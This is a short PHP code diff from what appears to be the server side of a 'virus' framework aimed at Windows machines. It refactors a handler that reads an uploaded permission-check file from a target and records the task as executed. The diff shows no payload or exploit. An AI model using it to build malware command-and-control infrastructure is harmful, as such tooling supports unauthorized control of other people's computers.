@@ -1,12 +1,6 @@
 <?php
 
-use Kelvinho\Virus\Attack\Packages\Windows\OneTime\CheckPermission\CheckPermission;
-use Kelvinho\Virus\Singleton\Header;
+/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\CheckPermission\CheckPermission $this */
 
-/** @var CheckPermission $this */
-
-if (!$this->requestData->hasFile("permFile")) Header::ok();
-
-$this->setPermissions($this->requestData->file("permFile"));
+$this->setPermissions($this->requestData->fileCheck("permFile"));
 $this->setExecuted();
-$this->saveState();
